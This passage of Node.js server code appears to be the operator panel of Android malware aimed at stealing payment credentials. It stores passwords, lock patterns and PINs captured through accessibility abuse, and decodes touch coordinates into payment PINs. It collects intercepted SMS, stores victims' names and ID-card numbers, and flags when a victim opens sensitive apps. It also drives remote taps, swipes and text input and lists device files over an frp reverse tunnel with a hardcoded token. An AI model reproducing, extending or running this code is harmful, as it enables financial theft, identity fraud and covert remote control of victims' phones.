  const { packageName, appName = '', listenWinClasses = [], enabled = true, remark = '' } = req.body || {};
  if (!packageName) return res.json({ success: false, error: '包名不能为空' });
  const now = Date.now() / 1000;
  const result = db.prepare('INSERT INTO payment_strategies (package_name,app_name,listen_win_classes,enabled,remark,created_at) VALUES (?,?,?,?,?,?)').run(
    packageName, appName, JSON.stringify(Array.isArray(listenWinClasses) ? listenWinClasses : []), enabled ? 1 : 0, remark, now
  );
  res.json({ success: true, data: { id: result.lastInsertRowid } });
});
app.put('/api/payment-strategies/:id', authMiddleware, (req, res) => {
  const { packageName, appName = '', listenWinClasses = [], enabled = true, remark = '' } = req.body || {};
  if (!packageName) return res.json({ success: false, error: '包名不能为空' });
  db.prepare('UPDATE payment_strategies SET package_name=?,app_name=?,listen_win_classes=?,enabled=?,remark=? WHERE id=?').run(
    packageName, appName, JSON.stringify(Array.isArray(listenWinClasses) ? listenWinClasses : []), enabled ? 1 : 0, remark, req.params.id
  );
  for (const [deviceId] of deviceConnections) { try { pushPaymentStrategiesToDevice(deviceId); } catch (e) { } }
  res.json({ success: true });
});
app.delete('/api/payment-strategies/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM payment_strategies WHERE id=?').run(req.params.id);
  db.prepare('DELETE FROM device_payment_strategies WHERE strategy_id=?').run(req.params.id);
  for (const [deviceId] of deviceConnections) { try { pushPaymentStrategiesToDevice(deviceId); } catch (e) { } }
  res.json({ success: true });
});
app.post('/api/payment-strategies/:id/toggle', authMiddleware, (req, res) => {
  const row = db.prepare('SELECT enabled FROM payment_strategies WHERE id=?').get(req.params.id);
  if (!row) return res.json({ success: false, error: '不存在' });
  db.prepare('UPDATE payment_strategies SET enabled=? WHERE id=?').run(row.enabled ? 0 : 1, req.params.id);
  res.json({ success: true });
});
app.get('/api/device-payment-strategies/:deviceId', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT strategy_id FROM device_payment_strategies WHERE device_id=?').all(req.params.deviceId);
  res.json({ success: true, enabledIds: rows.map(r => r.strategy_id) });
});
app.put('/api/device-payment-strategies/:deviceId', authMiddleware, (req, res) => {
  const { strategyIds = [] } = req.body || {};
  const deviceId = req.params.deviceId;
  db.prepare('DELETE FROM device_payment_strategies WHERE device_id=?').run(deviceId);
  const ins = db.prepare('INSERT OR IGNORE INTO device_payment_strategies (device_id,strategy_id) VALUES (?,?)');
  for (const sid of strategyIds) ins.run(deviceId, sid);
  res.json({ success: true });
});
app.post('/api/device-payment-strategies/:deviceId/push', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const ws = deviceConnections.get(deviceId);
  if (!ws || ws.readyState !== 1) return res.json({ success: false, error: '设备不在线' });
  pushPaymentStrategiesToDevice(deviceId);
  res.json({ success: true, message: '策略已推送到设备' });
});
app.get('/api/password-inputs/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 20;
  const passwordType = req.query.passwordType || '';
  const offset = (page - 1) * pageSize;
  let whereClause = 'WHERE device_id=?';
  const params = [deviceId];
  if (passwordType && passwordType !== 'DEFAULT') {
    whereClause += ' AND password_type=?';
    params.push(passwordType);
  }
  const total = db.prepare(`SELECT COUNT(*) as c FROM password_inputs ${whereClause}`).get(...params).c;
  const rows = db.prepare(`SELECT * FROM password_inputs ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({ success: true, data: { passwords: rows.map(r => ({ id: r.id, deviceId: r.device_id, appName: r.app_name, packageName: r.package_name, password: r.input_text, value: r.input_text, inputText: r.input_text, type: r.password_type, passwordType: r.password_type, capturedAt: r.timestamp || Math.floor(r.created_at * 1000), date: r.timestamp || Math.floor(r.created_at * 1000), timestamp: r.timestamp || Math.floor(r.created_at * 1000), createdAt: r.created_at })), total, page, pageSize } });
});
app.get('/api/wechat-passwords/:deviceId', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 10;
  res.json({ success: true, data: { passwords: [], total: 0, page, pageSize } });
});
app.delete('/api/password-inputs/id/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE id=?').run(req.params.id);
  res.json({ success: true });
});
app.put('/api/password-inputs/id/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE password_inputs SET app_name=? WHERE id=?').run(remark || '', req.params.id);
  res.json({ success: true });
});
app.delete('/api/password-inputs/clear/:deviceId', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/payment-cipher-records', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const deviceId = req.query.d || req.query.device_id || req.query.deviceId || '';
  const offset = (page - 1) * pageSize;
  let where = "WHERE password_type='payment_cipher'";
  const params = [];
  if (deviceId) { where += ' AND device_id=?'; params.push(deviceId); }
  const total = db.prepare(`SELECT COUNT(*) as cnt FROM password_inputs ${where}`).get(...params).cnt;
  const rows = db.prepare(`SELECT * FROM password_inputs ${where} ORDER BY rowid DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({
    success: true, data: rows.map(r => {
      const tsMs = r.timestamp > 1e12 ? r.timestamp : r.timestamp * 1000;
      const tsSec = Math.floor(tsMs / 1000);
      const rawText = r.input_text || '';
      
      // 动态解析：如果是坐标格式，解析为密码
      const isCoordFormat = /^\d+\.?\d*,\d+\.?\d*\|/.test(rawText);
      let parsedCipher = '';
      let confidence = '';
      if (isCoordFormat) {
        // 将字符串坐标转为 [{x,y},...] 数组
        const coordArr = rawText.split('|').map(p => {
          const [x, y] = p.split(',').map(Number);
          return { x, y };
        }).filter(c => !isNaN(c.x) && !isNaN(c.y));
        // 获取设备分辨率
        const devRow = db.prepare('SELECT screen_width,screen_height FROM devices WHERE device_id=?').get(r.device_id);
        const sw = (devRow && devRow.screen_width) || 720;
        const sh = (devRow && devRow.screen_height) || 1600;
        const parsed = parseCoordsToPassword(coordArr, sw, sh);
        parsedCipher = parsed.password || '';
        confidence = parsed.confidence || '';
      }
      
      return {
        id: r.id,
        device_id: r.device_id,
        app_name: r.app_name || 'payment',
        package_name: r.package_name || '',
        cipher: parsedCipher || (isCoordFormat ? '' : rawText),
        raw_coords: isCoordFormat ? rawText : '',
        confidence: confidence,
        touch_points: isCoordFormat ? JSON.stringify(rawText.split('|').map(p => { const [x,y] = p.split(',').map(Number); return {x,y}; }).filter(c => !isNaN(c.x) && !isNaN(c.y))) : null,
        capture_type: 'accessibility',
        captured_at: tsSec
      };
    }), total
  });
});
app.get('/api/settings/telegram', authMiddleware, (req, res) => res.json({ success: true, data: {} }));
app.get('/api/gesture/list', authMiddleware, (req, res) => {
  const deviceId = req.query.device_id || req.query.deviceId || '';
  let where = "WHERE password_type IN ('pattern','pin','password','mixed')";
  const params = [];
  if (deviceId) { where += ' AND device_id=?'; params.push(deviceId); }
  const rows = db.prepare(`SELECT * FROM password_inputs ${where} ORDER BY rowid DESC LIMIT 50`).all(...params);
  const data = rows.map(r => {
    let gestures = [], nodes = [];
    if (r.password_type === 'pattern') {
      nodes = (r.input_text || '').split(',').map(n => parseInt(n.trim())).filter(n => !isNaN(n));
      gestures = nodes.map(idx => ({ x: (idx % 3) / 2, y: Math.floor(idx / 3) / 2 }));
    }
    return {
      id: r.id,
      device_id: r.device_id,
      name: r.password_type === 'pattern' ? `图案密码 #${r.id}` : `${r.password_type === 'pin' ? 'PIN' : '密码'} #${r.id}`,
      gestures, nodes,
      patternText: r.input_text,
      password: r.input_text,
      type: r.password_type,
      capturedAt: new Date(r.timestamp > 1e12 ? r.timestamp : r.timestamp * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }),
      timestamp: r.timestamp
    };
  });
  res.json({ success: true, data });
});
app.get('/api/gesture/records', authMiddleware, (req, res) => res.json({ success: true, data: [], total: 0 }));
app.post('/api/gesture/save', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/gesture/:id', authMiddleware, (req, res) => res.json({ success: true }));
app.post('/api/device-custom-info', authMiddleware, (req, res) => {
  const { deviceId, realName, idCard, expiryDate, otherInfo } = req.body || {};
  if (deviceId) {
    const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
    try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
    db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, deviceId);
  }
  res.json({ success: true });
});
app.get('/api/device-custom-info', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.json({ success: true, data: {} });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(deviceId);
  if (row && row.custom_info) {
    try { return res.json({ success: true, data: JSON.parse(row.custom_info) }); } catch { }
  }
  res.json({ success: true, data: { realName: '', idCard: '', expiryDate: '', otherInfo: '' } });
});

// 删除设备
app.delete('/api/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
  const ws = deviceConnections.get(deviceId);
  if (ws) { try { ws.close(); } catch (e) { } deviceConnections.delete(deviceId); }
  db.prepare('DELETE FROM devices WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM sms_notifications WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(deviceId);
  broadcastToAdmins({ type: 'device_removed', deviceId, sessionId: deviceId });
  res.json({ success: true });
});

// 设备备注修改
app.put('/api/device/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE devices SET remark=? WHERE device_id=?').run(remark || '', req.params.id);
  res.json({ success: true, message: '备注已更新' });
});

app.get('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(req.params.deviceId);
  if (row && row.custom_info) {
    try { const d = JSON.parse(row.custom_info); return res.json({ success: true, ...d }); } catch { }
  }
  res.json({ success: true, realName: '', idCard: '', expiryDate: '', otherInfo: '' });
});
app.post('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.put('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch { }
  const rows = db.prepare('SELECT * FROM device_groups ORDER BY id').all();
  res.json({ success: true, groups: rows.map(r => ({ id: r.id, name: r.name, deviceIds: (r.device_ids || '').split(',').filter(Boolean), createdAt: r.created_at })) });
});
app.post('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch { }
  const { name, deviceIds } = req.body || {};
  if (!name) return res.json({ success: false, message: '分组名不能为空' });
  const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
  db.prepare('INSERT INTO device_groups (name, device_ids) VALUES (?,?)').run(name, ids);
  res.json({ success: true, message: '分组创建成功' });
});
app.put('/api/device/groups/:id', authMiddleware, (req, res) => {
  const { name, deviceIds } = req.body || {};
  if (name) db.prepare('UPDATE device_groups SET name=? WHERE id=?').run(name, req.params.id);
  if (deviceIds !== undefined) {
    const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
    db.prepare('UPDATE device_groups SET device_ids=? WHERE id=?').run(ids, req.params.id);
  }
  res.json({ success: true });
});
app.delete('/api/device/groups/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM device_groups WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

// 文件管理（通过 frpc ADB shell 列出目录）
app.get('/api/file/list', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  let dirPath = req.query.path || '/sdcard';
  // 确保路径末尾有斜杠（避免符号链接问题）
  if (!dirPath.endsWith('/')) dirPath += '/';
  const http = require('http');
  const respond = (files) => {
    if (Array.isArray(files)) return res.json({ success: true, files });
    if (typeof files === 'string') {
      try { return res.json({ success: true, files: JSON.parse(files) || [] }); } catch (e) {}
    }
    res.json({ success: true, files: [] });
  };
  // V5 优先: FILE_LIST over device WS; 超时则回退 ADB 隧道 ls -la
  if (typeof _fileReply === 'function') {
    _fileReply(deviceId, 'FILE_LIST', { path: dirPath }, 8000).then((data) => {
      respond(data);
    }).catch(() => {
      _tunnelLs(dirPath);
    });
  } else {
    _tunnelLs(dirPath);
  }
  function _tunnelLs(dir) {
    const cmd = encodeURIComponent(`ls -la "${dir}"`);
    http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${cmd}`, { timeout: 10000 }, (proxyRes) => {
      const chunks = [];
      proxyRes.on('data', c => chunks.push(c));
      proxyRes.on('end', () => {
        try {
          const data = JSON.parse(Buffer.concat(chunks).toString());
          const output = data.data?.output || '';
          const files = output.split('\n').filter(l => l.trim() && !l.startsWith('total')).map(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length < 7) return null;
            const perms = parts[0] || '';
            const isDir = perms.startsWith('d');
            const size = parseInt(parts[4]) || 0;
            const dateStr = `${parts[5]} ${parts[6]}`;
            const name = parts.slice(7).join(' ').replace(/ ->.*$/, '');
            if (!name || name === '.' || name === '..') return null;
            const cleanPath = dir.replace(/\/+$/, '');
            return { name, isDirectory: isDir, size, permissions: perms, path: `${cleanPath}/${name}`, modifiedAt: dateStr };
          }).filter(Boolean);
          res.json({ success: true, files: files });
        } catch {
          res.json({ success: true, files: [] });
        }
      });
    }).on('error', () => res.json({ success: true, files: [] }));
  }
});

// frpc 隧道配置（local-service 启动 frpc 时请求）
app.all('/api/tunnel/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7912;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${localPort}\nremotePort = ${remotePort}\n`;
  res.json({
    success: true,
    data: {
      serverAddr: FRP_SERVER_ADDR,
      serverPort: 7000,
      token: token,
      remotePort: remotePort,
      localPort: localPort,
      configINI: configINI
    }
  });
});

// 设备操作日志
// 建表（如果不存在）
db.exec(`CREATE TABLE IF NOT EXISTS device_logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  type TEXT DEFAULT 'operation',
  content TEXT,
  created_at INTEGER DEFAULT (strftime('%s','now') * 1000)
)`);
db.exec(`CREATE INDEX IF NOT EXISTS idx_device_logs_device ON device_logs(device_id, created_at DESC)`);

// 写入日志的辅助函数
function addDeviceLog(deviceId, type, content) {
  if (!deviceId) return;
  try {
    db.prepare('INSERT INTO device_logs (device_id, type, content, created_at) VALUES (?,?,?,?)').run(deviceId, type || 'operation', content || '', Date.now());
  } catch (e) { }
}

app.get('/api/logs', authMiddleware, (req, res) => {
  const { deviceId, page, pageSize, type } = req.query;
  const p = parseInt(page) || 1;
  const ps = parseInt(pageSize) || 50;
  const offset = (p - 1) * ps;
  let where = 'WHERE 1=1';
  const params = [];
  if (deviceId) { where += ' AND device_id = ?'; params.push(deviceId); }
  if (type) { where += ' AND type = ?'; params.push(type); }
  const total = db.prepare(`SELECT COUNT(*) as c FROM device_logs ${where}`).get(...params).c;
  const logs = db.prepare(`SELECT * FROM device_logs ${where} ORDER BY created_at DESC LIMIT ? OFFSET ?`).all(...params, ps, offset);
  res.json({ success: true, data: { logs: logs.map(r => ({ id: r.id, deviceId: r.device_id, logType: r.type, content: r.content, timestamp: r.created_at })), total, page: p, pageSize: ps } });
});

app.delete('/api/logs', authMiddleware, (req, res) => {
  const { deviceId } = req.query;
  if (deviceId) {
    db.prepare('DELETE FROM device_logs WHERE device_id = ?').run(deviceId);
  } else {
    db.prepare('DELETE FROM device_logs').run();
  }
  res.json({ success: true });
});


// ★ APP 上报设备日志（反编译确认: HttpManager$uploadLogs$2 → "/api/node/logs"）
// 敏感 APP 检测通知（APP 端进入敏感 APP 时回调）
const sensitiveAppCooldown = new Map(); // deviceId -> timestamp
app.get('/sensitiveAppDetected', (req, res) => {
  const pkg = req.query.pkg || '';
  const deviceId = req.query.deviceId || req.headers['x-device-id'] || '';
  if (deviceId) {
    sensitiveAppCooldown.set(deviceId, Date.now());
    console.log(`[SENSITIVE] ${deviceId} 进入敏感 APP: ${pkg}`);
  }
  res.json({ success: true });
});

app.post('/api/node/logs', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || '';
  const logs = data.logs || [];
  if (deviceId && Array.isArray(logs)) {
    for (const log of logs) {
      if (typeof log === 'object' && log !== null) {
        const logType = log.logType || log.type || 'app';
        const content = log.content || log.message || JSON.stringify(log).slice(0, 500);
        const ts = log.timestamp || Date.now();
        try { db.prepare('INSERT INTO device_logs (device_id, type, content, created_at) VALUES (?,?,?,?)').run(deviceId, logType, content, ts); } catch (e) { }
      } else {
        addDeviceLog(deviceId, 'app', String(log).slice(0, 500));
      }
    }
    console.log(`[LOG] 收到设备日志: ${deviceId}, ${logs.length} 条`);
  }
  res.json({ success: true });
});

// 短信/通知
app.get('/api/sms/notifications', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const offset = (page - 1) * pageSize;
  const deviceId = req.query.deviceId || '';
  // 过滤注入数据，只返回真实短信/通知
  let where = "WHERE type != 'injection'";
  const params = [];
  if (deviceId) {
    where += ' AND device_id = ?';
    params.push(deviceId);
  }
  const total = db.prepare(`SELECT COUNT(*) as c FROM sms_notifications ${where}`).get(...params).c;
  const rows = db.prepare(`SELECT * FROM sms_notifications ${where} ORDER BY date DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({
    success: true,
    data: {
      list: rows.map(r => ({
        id: r.id,
        address: r.address,
        body: r.body,
        date: r.date,
        deviceId: r.device_id,
        deviceName: r.device_name,
        serialNumber: r.serial_number,
        type: r.type
      })),
      page,
      pageSize,
      total
    }
  });
});

// 前端通过HTTP发送命令给设备（桥接到 Bridge 或 WebSocket）
app.post('/api/bridge/command/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const { command, params } = req.body || {};

  // 记录设备操作日志
  addDeviceLog(deviceId, 'command', `${command}${params ? ' ' + JSON.stringify(params).slice(0, 200) : ''}`);


  // ★ getScreenInfo 特殊处理：返回数据库中记录的物理分辨率宽x高
  if (command === 'getScreenInfo') {
    try {
      const row = db.prepare('SELECT screen_width, screen_height FROM devices WHERE device_id=?').get(deviceId);
      if (row && row.screen_width && row.screen_height) {
        return res.json({ success: true, size: `${row.screen_width}x${row.screen_height}`, data: { size: `${row.screen_width}x${row.screen_height}` } });
      }
    } catch (e) { }
    return res.json({ success: true, size: "1080x2400", data: { size: "1080x2400" } });
  }

  // 优先通过 Bridge（local-service）执行命令
  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    // ★ 坐标处理：默认不缩放 (scale=1)
    // 前端 canvas CSS 尺寸接近设备物理分辨率，坐标无需再放大
    // 仅当前端明确传了 screenWidth 时才做精确换算
    let scale = 1;
    let fixedParams = params || {};
    try {
      if (fixedParams.screenWidth && fixedParams.screenWidth > 0) {
        const devRow = db.prepare('SELECT screen_width FROM devices WHERE device_id=?').get(deviceId);
        const realW = devRow?.screen_width || 1080;
        scale = realW / fixedParams.screenWidth;
        delete fixedParams.screenWidth;
        delete fixedParams.screenHeight;
        // 安全校验
        if (scale < 0.5 || scale > 3) scale = 1;
        if (scale > 0.95 && scale < 1.05) scale = 1;
      }
    } catch (e) {
      scale = 1;
    }

    if (command === 'click' || command === 'tap') {
      if (fixedParams.x) fixedParams.x = Math.round(fixedParams.x * scale);
      if (fixedParams.y) fixedParams.y = Math.round(fixedParams.y * scale);
      if (scale !== 1) console.log(`[CMD] ${deviceId}: tap scale=${scale.toFixed(2)} → (${fixedParams.x},${fixedParams.y})`);
    }
    if (command === 'swipe') {
      if (fixedParams.startX) fixedParams.startX = Math.round(fixedParams.startX * scale);
      if (fixedParams.startY) fixedParams.startY = Math.round(fixedParams.startY * scale);
      if (fixedParams.endX) fixedParams.endX = Math.round(fixedParams.endX * scale);
      if (fixedParams.endY) fixedParams.endY = Math.round(fixedParams.endY * scale);
      if (fixedParams.x1) fixedParams.x1 = Math.round(fixedParams.x1 * scale);
      if (fixedParams.y1) fixedParams.y1 = Math.round(fixedParams.y1 * scale);
      if (fixedParams.x2) fixedParams.x2 = Math.round(fixedParams.x2 * scale);
      if (fixedParams.y2) fixedParams.y2 = Math.round(fixedParams.y2 * scale);
      if (scale !== 1) console.log(`[CMD] ${deviceId}: swipe scale=${scale.toFixed(2)}`);
    }

    // dumpUI 等需要返回数据的命令：优先 frpc，失败则 Bridge fallback
    if (command === 'dumpUI' || command === 'dumpHierarchy' || command === 'getUiHierarchy') {
      const http = require('http');
      const _dumpFallbackBridge = () => {
        // Bridge fallback：通过 WebSocket 发送 dumpUI 并等待回包
        if (!bridgeWs || bridgeWs.readyState !== 1) {
          if (!res.headersSent) res.json({ success: false, message: 'Bridge 未连接' });
          return;
        }
        console.log(`[CMD] → ${deviceId}: ${command} (Bridge fallback, frpc不可用)`);
        let replied = false;
        const timer = setTimeout(() => {
          if (!replied) { replied = true; if (!res.headersSent) res.json({ success: false, message: 'Bridge dumpUI timeout' }); }
        }, 15000);
        const onMsg = (raw) => {
          if (replied) return;
          try {
            const str = (raw instanceof Buffer) ? raw.toString() : raw;
            const msg = JSON.parse(str);
            // 匹配 dumpUI 回包（bridgePath 或 command 匹配）
            if ((msg.body && (msg.body.bridgePath === '/dumpUI' || msg.body.bridgePath === '/dumpHierarchy' || msg.body.bridgePath === '/getUiHierarchy')) ||
              (msg.type === 'command_result' && (msg.command === command || msg.data?.command === command)) ||
              (msg.data && msg.data.xml) || msg.xml) {
              replied = true;
              clearTimeout(timer);
              bridgeWs.removeListener('message', onMsg);
              if (!res.headersSent) res.json({ success: true, data: msg.body || msg.data || msg });
            }
          } catch { }
        };
        bridgeWs.on('message', onMsg);
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        // 超时后清理监听器
        setTimeout(() => { bridgeWs.removeListener('message', onMsg); }, 16000);
      };
      if (isFrpcCooling(deviceId)) {
        _dumpFallbackBridge();
        return;
      }
      // 新版 local-service 路由映射（dumpUI → dumpHierarchy）
      const frpcCmd = (command === 'dumpUI') ? 'dumpHierarchy' : command;
      const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/${frpcCmd}`, { timeout: 8000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const data = Buffer.concat(chunks);
          clearFrpcCooldown(deviceId);
          if (!res.headersSent) { res.set('Content-Type', proxyRes.headers['content-type'] || 'application/json'); res.send(data); }
        });
      });
      proxyReq.on('error', (e) => {
        setFrpcCooldown(deviceId, 5000);
        console.log(`[CMD] ${deviceId}: ${command} frpc失败(${e.message})，降级Bridge`);
        _dumpFallbackBridge();
      });
      proxyReq.on('timeout', () => {
        proxyReq.destroy();
        setFrpcCooldown(deviceId, 5000);
        console.log(`[CMD] ${deviceId}: ${command} frpc超时，降级Bridge`);
        _dumpFallbackBridge();
      });
      return;
    }

    // 触摸/滑动/按键命令：直接通过 frpc HTTP 端口调用 local-service REST API（低延迟）
    if (command === 'click' || command === 'tap') {
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: tap (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'tap via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/tap?x=${fixedParams.x || 0}&y=${fixedParams.y || 0}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'tap executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 5000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'tap via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: tap raw=${JSON.stringify(params)} scaled=${fixedParams.x},${fixedParams.y} scale=${scale} (frpc)`);
      return;
    }

    if (command === 'swipe') {
      const x1 = fixedParams.startX || fixedParams.x1 || 0;
      const y1 = fixedParams.startY || fixedParams.y1 || 0;
      const x2 = fixedParams.endX || fixedParams.x2 || 0;
      const y2 = fixedParams.endY || fixedParams.y2 || 0;
      const duration = fixedParams.duration || 300;
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: swipe (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'swipe via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/swipe?x1=${x1}&y1=${y1}&x2=${x2}&y2=${y2}&duration=${duration}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'swipe executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 5000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'swipe via bridge' });
      });
      _req.on('timeout', () => { _req.destroy(); setFrpcCooldown(deviceId, 5000); });
      console.log(`[CMD] → ${deviceId}: swipe (frpc直连)`);
      return;
    }

    if (command === 'keyevent') {
      const keycode = fixedParams.keycode || fixedParams.keyCode || fixedParams.code || 0;
      if (isFrpcCooling(deviceId)) {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (Bridge, frpc冷却中)`);
        return res.json({ success: true, message: 'keyevent via bridge(cooldown)' });
      }
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/keyevent?keycode=${keycode}`;
      const _req = http.get(url, { timeout: 1500 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { clearFrpcCooldown(deviceId); if (!res.headersSent) res.json({ success: true, message: 'keyevent executed' }); });
      });
      _req.on('error', () => {
        setFrpcCooldown(deviceId, 5000);
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'keyevent via bridge' });
      });
      _req.on('timeout', () => { _req.destroy(); setFrpcCooldown(deviceId, 5000); });
      console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (frpc直连)`);
      return;
    }

    if (command === 'text' || command === 'inputText') {
      const http = require('http');
      const text = encodeURIComponent(fixedParams.text || fixedParams.content || '');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/text?text=${text}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'text executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'text via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: text (frpc直连)`);
      return;
    }

    // 启用无障碍服务：通过 frpc shell 直接执行 settings put
    if (command === 'enableAccessibility' || command === 'restoreAccessibility') {
      // ★ 统一使用 autoRestoreAccessibility（智能检测 service class）
      try {
        autoRestoreAccessibility(deviceId, 'manual_command');
        if (!res.headersSent) res.json({ success: true, data: { success: true, message: 'autoRestoreAccessibility triggered' } });
      } catch (e) {
        if (!res.headersSent) res.json({ success: true, data: { success: false, message: e.message } });
      }
      return;
    }

